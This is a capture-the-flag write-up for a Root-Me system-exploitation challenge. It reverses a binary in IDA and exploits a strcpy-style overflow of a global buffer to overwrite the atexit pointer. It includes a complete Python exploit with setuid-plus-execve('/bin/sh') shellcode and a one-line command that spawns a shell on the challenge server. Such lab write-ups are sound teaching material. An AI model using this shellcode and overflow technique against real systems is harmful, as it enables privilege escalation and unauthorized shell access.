### S0lv3d by H4yicl3

First i download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```

I use IDA to analysis the code .

the main calling function cp_username 
```
int __cdecl cp_username(int username, int arg)
{
  bool v2; // al@1
  int result; // eax@2

  do
  {
    *(_BYTE *)username = *(_BYTE *)arg;
    v2 = *(_BYTE *)username++ != 0;     //username++
    ++arg;				//arg++ 
					//it's assign value of arg to username
  }
  while ( v2 );
  result = username;
  *(_BYTE *)username = 0;		//byte of present username = 0 
  return result;			//end of while
}
```
that mean this function look like strcpy


```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( argc != 2 )
  {
    printf("[-] Usage : %s <username>\n", *argv);
    exit(0);
  }
  cp_username((int)&username, (int)argv[1]);
  printf("[+] Running program with username : %s\n", &username);
  atexit(0);				//end with atexit() function so we can't overflow the return address
}
```
But we finded this in exports windows in IDA
```
_atexit 0804A240 
username 0804A040
```
That mean we can overflow username and change the address of _atexit() function that the program use to exit
0x0804A240 - 0x0804A040 = 512
so we overflow 512 byte -> 4byte next is address of _atexit() !! you know ?
try write a simple script look like!!

```python
shell = "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
lenofshell=44
padding =(512-lenofshell-4)*"A"
address_of_username ="\x40\xA0\x04\x08"
retn=address_of_username
print shell + padding + retn
```
try to exploit it with the following step
```
./ch7 `(python ch7.py)`
```

we controled the shell !! GLHF !!

exploit in sever
```
./ch7 $(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+(512-48)*"A"+"\x40\xA0\x04\x08"')
```
